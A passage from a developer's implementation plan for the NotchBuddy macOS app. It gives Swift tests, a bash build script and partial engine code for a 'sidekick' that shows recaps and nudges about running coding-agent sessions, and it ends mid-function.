    }
}
```

- [ ] **Step 4: Run the test to make it pass**

Run: `bash scripts/test-sidekick-voice.sh`
Expected: PASS. `acceptNicerLine: 39 cases`, 28 `✓` lines in all, then `All tests passed.`

Bite it once: delete the guard that keeps the request local: `sed -i '' 's/guard let c = candidate, c.placement == .local, let prompt/guard let c = candidate, let prompt/' NotchBuddy/Sources/App/SidekickVoiceLocal.swift && bash scripts/test-sidekick-voice.sh 2>&1 | grep -E "✗|failed"`. Expected: `✗ a network candidate is never asked`, `✗ nor a cloud one`, then `2 test(s) failed.` Undo it with `sed -i '' 's/guard let c = candidate, let prompt/guard let c = candidate, c.placement == .local, let prompt/' NotchBuddy/Sources/App/SidekickVoiceLocal.swift` and run the test again.

- [ ] **Step 5: Commit**

```bash
cd NotchBuddy && xcodegen > /dev/null && cd ..
```

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): the local voice, from voice-cases.json

acceptNicerLine guards the swap of a template for a sentence from a model; the request goes only to a local model, never by Auto, as one message with the template's own words.

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickVoice.swift NotchBuddy/Sources/App/SidekickVoiceLocal.swift tests/SidekickVoiceTests.swift scripts/test-sidekick-voice.sh NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj
git commit -F "$MSG"
```

---

### Task 9: The engine: the whole flow, with everything it needs handed in

**Agent:** `nm-implementer-deep` (**Sonnet 5.5, high: CLAUDE.md trigger 1**, timers and state flow the task must get right rather than copy: re-entrancy, one clock, what a note does when the gate says no). If a Haiku agent is given it and fails twice, it goes to the deep one (trigger 2) and the ledger says so.

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickEngine.swift`, `tests/SidekickEngineTests.swift`, `scripts/test-sidekick-engine.sh`

**Interfaces:**
- Consumes: every pure file of Tasks 1 to 8 (`SidekickLedger`, `SidekickStuck`, `SidekickRecap`, `SidekickSettings`, `SidekickStore`, `SidekickPresence`, `SidekickGate`, `SidekickNotes`, `SidekickClock`), `tests/CatSettingsSupport.swift` (`MemoryBacking`).
- Produces: `SidekickEngine` (`@MainActor`, an `ObservableObject`): `Env` (`now`, `idleSeconds`, `cardInFront`, `ownCardShown`, `canHost`, `typing`, `ratelimited`, `pointerOver`, `present`, `retract`, `polish`, `platform`), `showing`, `ledger`, `presence`, `notes`, `store`, `clock`, `polishTask`, `init(store:clock:env:codex:)`, `feed(payload:)`, `approvalAnswered(agentId:sessionId:)`, `presenceEvent(_:)`, `tick()`, `envChanged()`, `dismiss()`, `act()`, `noteSeen()`, `liveAgents`, `status(for:)` and `evaluate()`. Tasks 10 to 19 read them.

The engine is the sidekick's brain and touches nothing of the app: the app hands it the time, the idle seconds, what is in front of the island and so on as closures (`Env`), and takes what it says through two more (`present`, `retract`). So a test drives it with a clock and a timer **by hand** and proves the whole flow (a recap after a lock, a nudge for a loop, a held note, a dropped one, a muted kind) without launching anything. Every input (an event, a signal from the Mac, a tick, the clock, a change of what is in front of the island, a click on a note) updates the memory and then runs `evaluate()`: it retires a note whose time is up (unless the pointer is on it, which keeps it ten seconds more), drops the held notes whose time is up, asks the stuck rules for a nudge, drops a nudge that is no longer true (the request was answered, the agent spoke again, the session ended), changes the waiting nudge's words in place at the give-up time (it is not a second nudge), shows the first note the gate lets through, and sets the clock to the nearest deadline. Decisions the spec left open, each pinned by the test:
- **A session is marked as nudged when its nudge is SHOWN** (owner's answer, 2026-10-14), not when it is made. The contract's `stuckStep` skips a session with `nudgedAt` and leaves the call to `markNudged` to the app; the engine makes it right after `notes.show` for a nudge. A nudge that is held and then dropped silently was never given, so the next `evaluate` offers it again (`notes.offer` keeps one held note per session and kind, so it is never queued twice). While one nudge is pending, `stuckStep` keeps naming that same session; another session's nudge waits until it has shown or gone.
- **A note that can never show** (the switch is off, its kind is muted, its period has had its recap) is dropped at once, not held.
- **The idle time is read** on a tick that is due (at most every 5 s, while an agent is live), on every hook event, and on an unlock or a wake; a held note is asked again on the island's own tick at most once a second, which is how "the user stopped typing" is noticed with no timer of its own.
- Only the **recap** is offered to the local voice (it has facts); a nudge's words are fixed.

- [ ] **Step 1: Write the failing test**

The program runs the scripted flows the owner will see, each on its own engine with its own hand clock: a recap after a lock (and what it says), Unmute after two dismissals, a nudge for a loop (once per session, gone by itself after 20 s, not a dismissal), the waiting nudge (its own card on screen: no deadline; the clock fires at 60 s; the words change at 115 s; the user answers: the nudge goes), the gate (typing holds a note, a view that cannot host it holds it, 30 s drops it silently, it is offered again, and it shows once when the gate opens), a recap that replaces an unseen nudge and one that does not replace a seen one, the master switch, quiet for five minutes, **nothing runs when no agent does** (no timer is set, the OS is never asked for the idle time, at most every 5 s otherwise), away by idle and its return, the local voice (the words replaced once, not under the pointer, not when switched off) and the status question.

**Create `tests/SidekickEngineTests.swift`**

```swift
import Foundation

// The sidekick's brain, driven by hand: a world the test controls (the clock, the idle seconds, what is in front of the island, typing, the pointer) and a timer that runs when the test says. The scripted
// runs prove the whole flow the owner will see: a recap after a lock, a nudge for a loop, a nudge for a request nobody is looking at, a note that is held and dropped, a kind that is muted after two
// dismissals and comes back with Unmute, and that nothing runs (no timer is set) when no agent does. Run through scripts/test-sidekick-engine.sh.

@main
enum SidekickEngineTests {
    @MainActor final class World {
        var t = 10_000_000.0
        var idle = 0.0
        /// How many times the OS was asked for the idle time.
        var idleCalls = 0
        var card: String?
        var ownCard = false
        var host = true
        var typing = false
        var ratelimited = false
        var pointer = false
        var polishReply: String?
        var presented: [SKNote] = []
        var retracted: [SKNote] = []
        var timers: [(id: Int, at: Double, fire: @MainActor @Sendable () -> Void)] = []
        var next = 0

        func schedule(_ after: Double, _ fire: @escaping @MainActor @Sendable () -> Void) -> SidekickClock.Cancel {
            next += 1
            let id = next
            timers.append((id, t + after, fire))
            return { [self] in MainActor.assumeIsolated { timers.removeAll { $0.id == id } } }
        }
        /// Moves the time on and runs the timers that fall due on the way, in order, each at its own time.
        func advance(_ ms: Double) {
            let end = t + ms
            while let d = timers.filter({ $0.at <= end }).min(by: { $0.at < $1.at }) { timers.removeAll { $0.id == d.id }; t = max(t, d.at); d.fire() }
            t = end
        }
    }

    @MainActor static func make(_ w: World, store: SidekickStore = SidekickStore(backing: MemoryBacking())) -> SidekickEngine {
        let clock = SidekickClock(now: { w.t }, schedule: { w.schedule($0, $1) })
        var env = SidekickEngine.Env(now: { w.t })
        env.idleSeconds = { w.idleCalls += 1; return w.idle }
        env.cardInFront = { w.card }
        env.ownCardShown = { w.ownCard }
        env.canHost = { w.host }
        env.typing = { w.typing }
        env.ratelimited = { w.ratelimited }
        env.pointerOver = { w.pointer }
        env.present = { w.presented.append($0) }
        env.retract = { w.retracted.append($0) }
        env.polish = { _ in w.polishReply }
        return SidekickEngine(store: store, clock: clock, env: env)
    }

    static func hook(_ name: String, _ extra: [String: Any] = [:]) -> [String: Any] {
        var p: [String: Any] = ["hook_event_name": name, "session_id": "S1", "cwd": "/Users/me/proj", "term_program": "vscode"]
        for (k, v) in extra { p[k] = v }
        return p
    }
    static func post(_ command: String) -> [String: Any] { hook("PostToolUse", ["tool_name": "Bash", "tool_input": ["command": command]]) }
    static func edit(_ file: String) -> [String: Any] { hook("PostToolUse", ["tool_name": "Edit", "tool_input": ["file_path": "/Users/me/proj/\(file)", "old_string": "a", "new_string": "b"]]) }

    @MainActor static func main() async {
        let sec = 1000.0, min = 60_000.0

        CT.section("a recap after a lock: while you were away, once, at the return")
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            e.feed(payload: hook("UserPromptSubmit", ["prompt": "SECRET"]))
            w.advance(1 * sec); e.presenceEvent(.lock)
            w.advance(30 * sec); e.feed(payload: edit("a.js"))
            w.advance(30 * sec); e.feed(payload: post("npm test"))
            w.advance(30 * sec); e.feed(payload: hook("Stop", ["last_assistant_message": "SECRET"]))
            CT.check("nothing shows while the user is away", w.presented.count, 0)
            CT.check("and the clock has nothing to wait for (a nudge falls due while away is dropped, the recap covers it)", e.clock.deadline, nil)
            w.advance(2 * min); e.presenceEvent(.unlock)
            CT.check("at the return the recap shows", w.presented.map(\.kind), ["recap"])
            CT.check("in the template's words, with a basename and counts", w.presented.first?.text, "While you were away, Claude Code in proj ran 2 steps, edited a.js, and finished.")
            CT.check("it is on the island for the note's time (45 s): the clock is set to it", e.clock.deadline, w.t + 45 * sec)
            e.dismiss()
            CT.check("OK counts as a dismissal of the recap, and the note leaves the island", "\(e.store.settings.dismissals["recap"] ?? -1) / \(w.retracted.count)", "1 / 1")
            CT.check("and the clock is idle again", e.clock.deadline, nil)
            CT.check("the same away period does not give a second recap", { e.presenceEvent(.unlock); return w.presented.count }(), 1)
        }

        CT.section("two dismissals mute the recap; Unmute brings it back")
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            func away(_ file: String) {
                e.presenceEvent(.lock); w.advance(10 * sec); e.feed(payload: edit(file)); w.advance(3 * min); e.presenceEvent(.unlock)
            }
            away("a.js"); e.dismiss()
            away("b.js"); e.dismiss()
            CT.check("two dismissals", e.store.settings.dismissals["recap"], 2)
            let before = w.presented.count
            away("c.js")
            CT.check("a muted recap never shows", w.presented.count, before)
            e.store.unmute("recap")
            away("d.js")
            CT.check("Unmute: the next return shows it again", w.presented.count, before + 1)
        }

        CT.section("a nudge for a loop: four of the same step, once per session")
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            for i in 0..<3 { w.advance(1 * sec); e.feed(payload: post("npm test")); _ = i }
            CT.check("three are not a loop", w.presented.count, 0)
            w.advance(1 * sec); e.feed(payload: post("npm test"))
            CT.check("the fourth is", w.presented.map(\.text), ["Claude Code has run the same step 4 times."])
            CT.check("it is a stuck.loop note about the Claude Code session", [w.presented[0].kind, w.presented[0].agentId ?? ""], ["stuck.loop", "integration_claude"])
            w.advance(1 * sec); e.feed(payload: post("npm test"))
            CT.check("the session has had its nudge: no second", w.presented.count, 1)
            w.advance(25 * sec)
            CT.check("a nudge goes by itself after 20 s", "\(e.showing == nil) / \(w.retracted.count)", "true / 1")
            CT.check("and that is not a dismissal", e.store.settings.dismissals["stuck.loop"], 0)
            w.advance(1 * sec); e.feed(payload: post("npm test"))
            CT.check("it was shown, so the session has had its nudge: the loop going on makes no second", "\(w.presented.count) / \(e.notes.held.count)", "1 / 0")
        }

        CT.section("a request nobody is looking at: the waiting nudge at 60 s, its words change at the give-up time")
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            e.feed(payload: hook("PermissionRequest", ["tool_name": "Bash", "tool_input": ["command": "git push"]]))
            w.ownCard = true; e.envChanged()
            CT.check("its own card is on screen: no deadline for it", e.clock.deadline, nil)
            w.advance(100 * sec); e.envChanged()
            CT.check("the card on screen says it all: no nudge", w.presented.count, 0)
            w.ownCard = false; w.card = "approval"
            e.envChanged()
            CT.check("a card is in front but not its own: the waiting nudge shows", w.presented.map(\.text), ["Claude Code is still waiting for your OK."])
            CT.check("the clock is set to the app's give-up time, 15 s on", e.clock.deadline, w.t + 15 * sec)
            w.advance(15 * sec)
            CT.check("at the Mac's give-up time (115 s) the words change in place", e.showing?.text, "Claude Code is waiting for your OK in the terminal.")
            CT.check("and it is not a second nudge", w.presented.count, 1)
        }
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            e.feed(payload: hook("PermissionRequest", ["tool_name": "Bash", "tool_input": ["command": "git push"]]))
            w.advance(60 * sec)
            CT.check("the clock fires at 60 s with nobody looking: the nudge shows", w.presented.map(\.kind), ["stuck.waiting"])
            e.approvalAnswered(agentId: "integration_claude", sessionId: "S1")
            CT.check("the user answers: the nudge is no longer true and goes, uncounted", "\(e.showing == nil) / \(e.store.settings.dismissals["stuck.waiting"] ?? -1)", "true / 0")
        }

        CT.section("the gate holds a note, and drops it silently when its time is up")
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            w.typing = true
            for _ in 0..<4 { w.advance(1 * sec); e.feed(payload: post("make")) }
            CT.check("the user is typing: the nudge is held, not shown", "\(w.presented.count) / \(e.notes.held.count)", "0 / 1")
            CT.check("the clock waits for the hold to run out (30 s)", e.clock.deadline, w.t + 30 * sec)
            w.typing = false
            w.advance(10 * sec); e.envChanged()
            CT.check("typing stops within 30 s: it shows", w.presented.count, 1)
        }
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            w.typing = true
            for _ in 0..<4 { w.advance(1 * sec); e.feed(payload: post("make")) }
            w.typing = false
            e.tick()
            CT.check("a held note is asked again on the island's own tick: typing stopped, and nothing but the tick noticed", w.presented.count, 1)
        }
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            w.host = false
            for _ in 0..<4 { w.advance(1 * sec); e.feed(payload: post("make")) }
            e.tick()
            w.host = true
            e.tick()
            CT.check("the held note is asked again at most once a second: not at once", w.presented.count, 0)
            w.advance(1100); e.tick()
            CT.check("and after a second the tick finds the gate open", w.presented.count, 1)
        }
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            w.host = false
            for _ in 0..<4 { w.advance(1 * sec); e.feed(payload: post("make")) }
            w.advance(31 * sec)
            CT.check("the island is open on something else for 30 s: the held nudge runs out, silently (no dismissal)", "\(w.presented.count) / \(e.store.settings.dismissals["stuck.loop"] ?? -1)", "0 / 0")
            CT.check("it was never shown, so it was never given: the session is offered the nudge again", e.notes.held.count, 1)
            w.host = true; e.envChanged()
            CT.check("the moment the island can host it, it shows, once", w.presented.map(\.text), ["Claude Code has run the same step 4 times."])
            for _ in 0..<4 { w.advance(1 * sec); e.feed(payload: post("make")) }
            CT.check("and once shown the session has had its nudge: no second", w.presented.count, 1)
        }

        CT.section("a recap replaces a nudge nobody has seen; the switch turns it all off")
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            for _ in 0..<4 { w.advance(1 * sec); e.feed(payload: post("make")) }
            w.pointer = true   // the pointer is on the island: the nudge stays
            e.presenceEvent(.lock); w.advance(10 * sec); e.feed(payload: edit("a.js")); w.advance(3 * min)
            CT.check("a nudge is on screen, unseen", [w.presented.map(\.kind), [e.showing?.kind ?? ""]], [["stuck.loop"], ["stuck.loop"]])
            e.presenceEvent(.unlock)
            CT.check("the recap replaces it", w.presented.map(\.kind), ["stuck.loop", "recap"])
            CT.check("and the nudge left the island", w.retracted.map(\.kind), ["stuck.loop"])
            e.store.setOn(false)
            e.envChanged()
            CT.check("the master switch off: the note on screen goes", e.showing == nil, true)
            for _ in 0..<4 { w.advance(1 * sec); e.feed(payload: post("make2")) }
            CT.check("and no nudge shows", w.presented.count, 2)
            CT.check("and no deadline is waited for", e.clock.deadline, nil)
        }
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            for _ in 0..<4 { w.advance(1 * sec); e.feed(payload: post("make")) }
            e.noteSeen()
            w.pointer = true
            e.presenceEvent(.lock); w.advance(10 * sec); e.feed(payload: edit("a.js")); w.advance(3 * min); e.presenceEvent(.unlock)
            CT.check("a nudge the user has seen is not replaced: the recap waits for the gate and is dropped when its time is up", [w.presented.map(\.kind), e.notes.held.map(\.note.kind)], [["stuck.loop"], ["recap"]])
        }

        CT.section("quiet for five minutes; and nothing runs when no agent does")
        do {
            let w = World(), e = make(w)
            CT.check("a fresh engine sets no timer and has none scheduled", "\(e.clock.deadline == nil) / \(e.clock.scheduled) / \(w.timers.count)", "true / 0 / 0")
            for _ in 0..<50 { w.advance(100); e.tick() }
            CT.check("fifty ticks with no live session never ask the OS for the idle time", w.idleCalls, 0)
            e.feed(payload: hook("SessionStart"))
            e.feed(payload: hook("UserPromptSubmit"))
            CT.check("a session that is thinking sets the clock to 5 minutes after its last event", e.clock.deadline, w.t + 5 * min)

            w.advance(5 * min)
            CT.check("at that time it is quiet", w.presented.map(\.text), ["Claude Code has been quiet for 5 minutes."])
            e.feed(payload: hook("SessionEnd"))
            CT.check("the session ends: the note about it goes (stale), and no timer is left", "\(e.showing == nil) / \(e.clock.deadline == nil)", "true / true")
        }

        CT.section("the idle time is read at most every 5 s, on the island's own tick, and only while an agent has a live session")
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            let calls = w.idleCalls
            for _ in 0..<40 { w.advance(100); e.tick() }
            CT.check("forty ticks in four seconds: not read again", w.idleCalls, calls)
            w.advance(1500); e.tick()
            CT.check("the first tick past 5 s reads it once", w.idleCalls, calls + 1)
            e.feed(payload: hook("SessionEnd"))
            let after = w.idleCalls
            for _ in 0..<100 { w.advance(100); e.tick() }
            CT.check("once no session is live it is not read at all", w.idleCalls, after)
        }

        CT.section("away by idle: a tick that already exists reads the idle time, and a return is noticed")
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            e.feed(payload: hook("UserPromptSubmit"))
            w.advance(60 * sec); w.idle = 60; e.tick()
            w.advance(10 * sec); e.feed(payload: edit("a.js"))
            w.advance(5 * sec); w.idle = 400; e.tick()
            CT.check("300 s idle or more is away", e.presence.reasons, ["idle"])
            w.advance(60 * sec); e.feed(payload: post("ls"))
            w.advance(2 * min)
            w.idle = 1; e.tick()
            CT.check("a sample under 3 s is back, and the agent's work in between is recapped", w.presented.map(\.kind), ["recap"])
            CT.check("the recap counts what happened since the idle began (400 s before the sample)", w.presented.first?.text.contains("ran 2 steps"), true)
        }
        do {
            let w = World(), e = make(w)
            e.feed(payload: hook("SessionStart"))
            w.idle = 400
            e.feed(payload: hook("PostToolUse", ["tool_name": "Read", "tool_input": ["file_path": "/Users/me/proj/a.js"]]))
            CT.check("a hook event reads the idle time too", e.presence.reasons, ["idle"])
        }

        CT.section("the local voice: a nicer sentence replaces the template once, unless the pointer is on the note")
        do {
            let w = World(), e = make(w)
            w.polishReply = "Claude Code ran 2 steps in proj, edited a.js and finished."
            e.feed(payload: hook("SessionStart"))
            e.presenceEvent(.lock); w.advance(10 * sec); e.feed(payload: edit("a.js")); w.advance(3 * min); e.feed(payload: post("ls")); e.presenceEvent(.unlock)
            await e.polishTask?.value
            CT.check("it replaced the words", e.showing?.text, "Claude Code ran 2 steps in proj, edited a.js and finished.")
        }
        do {
            let w = World(), e = make(w)
            w.polishReply = "A nicer line."; w.pointer = true
            e.feed(payload: hook("SessionStart"))
            e.presenceEvent(.lock); w.advance(10 * sec); e.feed(payload: edit("a.js")); w.advance(3 * min); e.presenceEvent(.unlock)
            await e.polishTask?.value
            CT.check("with the pointer on the note the words stay", e.showing?.text.hasPrefix("While you were away"), true)
        }
        do {
            let w = World(), e = make(w)
            e.store.setLocal(false)
            w.polishReply = "A nicer line."
            e.feed(payload: hook("SessionStart"))
            e.presenceEvent(.lock); w.advance(10 * sec); e.feed(payload: edit("a.js")); w.advance(3 * min); e.presenceEvent(.unlock)
            CT.check("with the local voice off, no request is made", e.polishTask == nil, true)
        }

        CT.section("the status question is answered from the ledger, on this machine")
        do {
            let w = World(), e = make(w)
            CT.check("a normal chat message is not the question", e.status(for: "can you tell me what claude is doing in the build"), nil)
            CT.check("nothing is running", e.status(for: "What are the agents doing?")?.lines, ["No agent is running right now."])
            CT.check("asked about one agent", e.status(for: "What's Claude doing?")?.lines, ["Claude Code is not running right now."])
            e.feed(payload: hook("SessionStart")); e.feed(payload: hook("UserPromptSubmit")); w.advance(5 * sec); e.feed(payload: post("ls"))
            CT.check("a live session: the template's words", e.status(for: "what's claude doing")?.lines, ["Claude Code in proj has run 1 step and is still working."])
            CT.check("and who is live", e.liveAgents, ["integration_claude"])
            e.feed(payload: hook("SessionEnd"))
            CT.check("an ended session is no longer live", e.liveAgents, [])
        }
        CT.finish()
    }
}
```

**Create `scripts/test-sidekick-engine.sh`**

```bash
#!/usr/bin/env bash
# Sidekick engine: scripted runs of the whole flow (recap after a lock, nudges, held and dropped notes, mute and Unmute, the one clock) with a clock and a timer by hand. Compiled without AppState or AppKit.
set -euo pipefail
cd "$(dirname "$0")/.."
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-sidekick-engine.XXXXXX")"
trap 'rm -rf "$TEST_DIR"' EXIT
export NM_LOG_DIR="$TEST_DIR/logs"   # tests never write to ~/Library/Logs

APP=NotchBuddy/Sources/App
swiftc -swift-version 6 \
    $APP/CatMath.swift $APP/CatPresets.swift $APP/CatGeometry.swift $APP/Personality.swift $APP/CatRules.swift $APP/CatSettings.swift \
    $APP/SidekickText.swift $APP/SidekickExplain.swift $APP/SidekickLedger.swift $APP/SidekickStuck.swift $APP/SidekickRecap.swift $APP/SidekickSettings.swift $APP/SidekickStore.swift $APP/SidekickPresence.swift $APP/SidekickNotes.swift $APP/SidekickEngine.swift \
    tests/CatTestSupport.swift tests/CatSettingsSupport.swift tests/SidekickEngineTests.swift \
    -o "$TEST_DIR/sidekick-engine-tests"
"$TEST_DIR/sidekick-engine-tests"
```

Then make it executable: `chmod +x scripts/test-sidekick-engine.sh`

- [ ] **Step 2: Run the test to make it fail**

Run: `bash scripts/test-sidekick-engine.sh`
Expected: FAIL. `error opening input file` for `SidekickEngine.swift`.

- [ ] **Step 3: Write the engine**

**Create `NotchBuddy/Sources/App/SidekickEngine.swift`**

```swift
import Combine
import Foundation

// The sidekick's brain, with everything it needs from the app handed in: what the agents did (the ledger), whether the user is at the computer (presence), the stuck rules, the notes and the show gate,
// the dismissal memory and the ONE one-shot clock. It reads events and labels; it never answers a request, never sends anything and never logs. It touches nothing of the app directly: the app gives
// it the time, the idle seconds, what is in front of the island and so on as closures (`Env`), and takes what it says through two more (`present`, `retract`), so a test drives it with a clock and a timer
// by hand and proves the whole flow (a recap after a lock, a nudge for a loop, a held note, a dropped one, a muted kind) without launching anything. Foundation and Combine only.
//
// The flow, in one line: every input (an event, a signal from the Mac, a tick, the clock, a change of what is in front of the island, a click on a note) updates the memory and then runs `evaluate()`, which
// retires a note whose time is up, drops the held notes whose time is up, asks the stuck rules for a nudge, shows the first note the gate lets through and sets the clock to the nearest deadline.

@MainActor
final class SidekickEngine: ObservableObject {
    /// What the app gives the engine. Every closure has a quiet default, so a test sets only what it uses.
    struct Env {
        /// The sidekick's clock, in ms (wall time: the minutes a Mac slept count as time away).
        var now: () -> Double
        /// Seconds since the user's last input (`PresenceMonitor.idleSeconds`).
        var idleSeconds: () -> Double = { 0 }
        /// "approval" or "question" while a card is in front of the island, else nil.
        var cardInFront: () -> String? = { nil }
        /// The approval card is on screen right now (the waiting nudge is for a request whose card is NOT).
        var ownCardShown: () -> Bool = { false }
        /// The island is hidden or compact, or open on a view that can host a note (`SidekickHost`).
        var canHost: () -> Bool = { true }
        /// The user is typing in the island.
        var typing: () -> Bool = { false }
        /// An agent is rate-limited (the cat already shows it).
        var ratelimited: () -> Bool = { false }
        /// The pointer is on the island: a note is kept while it is.
        var pointerOver: () -> Bool = { false }
        /// The note goes on the island. The app opens the island on it, the way a finished task does.
        var present: (SKNote) -> Void = { _ in }
        /// The note leaves the island (answered, or its time is up).
        var retract: (SKNote) -> Void = { _ in }
        /// A nicer sentence for a recap from a model on this computer, or nil (`SidekickVoiceApp`). Never given anything but the note's own words and facts.
        var polish: (SKNote) async -> String? = { _ in nil }
        /// "mac", "windows" or "linux": when the app gave up on a request (`SidekickStuck.giveUpMs`).
        var platform = "mac"
    }

    /// The note on the island now, or nil. The view reads it.
    @Published private(set) var showing: SKNote?

    private(set) var ledger = SKLedger()
    private(set) var presence = SKPresence()
    private(set) var notes = SidekickNotes()
    let store: SidekickStore
    let clock: SidekickClock
    private let env: Env
    private let codex: Bool
    private var nextId = 1
    private var lastIdleSample: Double?
    private var lastHeldCheck: Double?
    private var evaluating = false, again = false
    /// The local voice's request for the note on screen, so a test can wait for it.
    private(set) var polishTask: Task<Void, Never>?

    init(store: SidekickStore, clock: SidekickClock, env: Env, codex: Bool = true) {
        self.store = store; self.clock = clock; self.env = env; self.codex = codex
        clock.onFire = { [weak self] in self?.evaluate() }
    }

    // MARK: What it is told

    /// A hook payload at the feed point. An event the ledger does not know is nothing. The idle time is read here too (a hook event is a tick that already exists).
    func feed(payload: [String: Any]) {
        guard let event = SidekickLedger.eventFrom(payload, now: env.now(), codex: codex) else { return }
        ledger = SidekickLedger.apply(ledger, event)
        sampleIdle()
        evaluate()
    }

    /// The user answered an approval card (Deny, Allow or Always): the one event that is not a hook.
    func approvalAnswered(agentId: String, sessionId: String) {
        ledger = SidekickLedger.apply(ledger, SidekickLedger.approvalAnswered(agentId: agentId, sessionId: SidekickLedger.capId(sessionId), now: env.now()))
        evaluate()
    }

    /// The Mac locked, slept, woke and so on (`PresenceMonitor`). A wake re-evaluates at once, because a one-shot timer does not fire while the Mac sleeps.
    func presenceEvent(_ event: SKPresenceFlags.Event) {
        step(event.signal)
        if event == .unlock || event == .wake { sampleIdle() }
        evaluate()
    }

    /// A tick the island already has (its poll). It asks the OS for the idle time only when one is due: at most every 5 s (every second while the user is away by idle), and only while an agent has a live session.
    func tick() {
        let now = env.now()
        // A note the gate is holding (the user was typing, the island was open on something else) is asked again, at most once a second: this is how a change that no deadline marks is noticed.
        if !notes.held.isEmpty, lastHeldCheck.map({ now < $0 || now - $0 >= 1000 }) ?? true { lastHeldCheck = now; evaluate() }
        if let last = lastIdleSample, last <= now, now - last < SidekickIdle.awayMs { return }   // the cheapest check first: this runs on every tick of the island's poll
        guard SidekickIdle.sampleDue(now: now, last: lastIdleSample, liveSessions: !SidekickLedger.live(ledger).isEmpty, idleAway: presence.reasons.contains("idle")) else { return }
        let before = presence
        sampleIdle()
        if presence != before { evaluate() }
    }

    /// Something that decides whether a note may show changed: the view or mode of the island, a card, typing, the pointer, a rate limit or a setting.
    func envChanged() { evaluate() }

    /// The user clicked OK, × or Not now: it counts as a dismissal of the note's kind.
    func dismiss() {
        guard let note = notes.retire() else { return }
        store.dismiss(note.kind)
        showing = nil
        env.retract(note)
        evaluate()
    }

    /// The user tapped a note's action (Show me): the note goes, and it is not a dismissal.
    func act() -> SKNote? {
        guard let note = notes.retire() else { return nil }
        showing = nil
        env.retract(note)
        evaluate()
        return note
    }

    /// The island is open on the note: the user has seen it.
    func noteSeen() { notes.markSeen() }

    // MARK: What it answers

    /// The agents that have a live session (one that has not ended): the cats a drop may hand a path to.
    var liveAgents: Set<String> { Set(SidekickLedger.live(ledger).map(\.agentId)) }

    /// "What's Claude doing?": the question's answer from the ledger, or nil when `text` is not the status question (it is then a normal chat message).
    func status(for text: String) -> SKLines? {
        let m = SidekickRecap.matchStatusQuestion(text)
        guard m.matched else { return nil }
        return SidekickRecap.status(now: env.now(), sessions: ledger.sessions, agent: m.agentId)
    }

    // MARK: Inside

    private func step(_ signal: SKSignal) {
        let r = SidekickPresence.step(presence, signal, now: env.now())
        presence = r.state
        if let back = r.back, store.settings.on, let recap = SidekickRecap.recap(awaySince: back.awaySince, now: env.now(), sessions: ledger.sessions) {
            notes.offer(SKNote(id: take(), kind: "recap", text: recap.lines.joined(separator: "\n"), facts: recap.facts, awaySince: back.awaySince, createdAt: env.now()), now: env.now())
        }
    }

    /// Asks the OS for the idle time now. Called by `tick` once a sample is due, on every hook event and on an unlock or a wake: each is a moment that already exists.
    private func sampleIdle() {
        lastIdleSample = env.now()
        step(.idle(seconds: env.idleSeconds()))
    }

    private func take() -> Int { defer { nextId += 1 }; return nextId }

    /// The nudge a note stands for, to ask the rules for its words again.
    private func nudge(of note: SKNote) -> SKNudge? {
        guard let key = note.key, let agent = note.agentId else { return nil }
        return SKNudge(kind: note.kind, reasonId: String(note.kind.dropFirst(6)), key: key, agentId: agent)
    }

    /// A nudge about a session that has moved on is moot: the request was answered, or the agent spoke again.
    private func stale(_ note: SKNote) -> Bool {
        guard let key = note.key, let s = ledger.sessions.first(where: { $0.key == key }) else { return note.kind != "recap" }
        if s.endedAt != nil { return true }
        switch note.kind {
        case "stuck.waiting": return s.state != "approval" || s.pendingApprovalAt == nil
        case "stuck.silent": return s.lastEventAt >= note.createdAt
        default: return false
        }
    }

    private func input(for n: SKNote, now: Double) -> SKShowInput {
        SKShowInput(on: store.settings.on, kind: n.kind, dismissals: store.settings.dismissals, away: presence.isAway, ratelimit: env.ratelimited(), card: env.cardInFront(), ownCard: env.ownCardShown(),
                    inputFocused: env.typing(), visible: notes.visible, lastShownAt: notes.lastShownAt, now: now, nudged: false, recapGiven: notes.recapGiven(for: n.awaySince))
    }

    private func retireShowing() {
        guard let note = notes.retire() else { return }
        showing = nil
        env.retract(note)
    }

    /// The heart of it. Re-entrant calls (the app reacting to a note it was just told to present) run once more afterwards, never inside.
    func evaluate() {
        if evaluating { again = true; return }
        evaluating = true
        defer { evaluating = false }
        repeat {
            again = false
            run()
        } while again
        clock.set(deadline())
    }

    private func run() {
        let now = env.now()
        ledger = SidekickLedger.prune(ledger, now: now)
        // The master switch off: nothing shows, and a note on screen goes.
        if !store.settings.on, showing != nil { retireShowing() }
        // A note on screen that has had its time goes quietly (it is not a dismissal), unless the pointer is on it.
        if notes.showingExpired(now: now) { if env.pointerOver() { notes.extendShowing(to: now + 10000) } else { retireShowing() } }
        // A held note that has had its time is dropped silently.
        _ = notes.dropExpired(now: now)
        // The stuck rules: at most one nudge, once per session. The contract's `markNudged` is the app's to call, and this is where the app calls it: when the nudge is actually SHOWN (below), not
        // when it is made. A nudge that is held and dropped without ever showing was never given, so the session may be nudged again (the same held note is not kept twice).
        if store.settings.on {
            let r = SidekickStuck.step(ledger, now: now, ctx: SKStuckContext(ratelimit: env.ratelimited(), away: presence.isAway, cardShown: env.ownCardShown(), platform: env.platform))
            if let n = r.nudge {
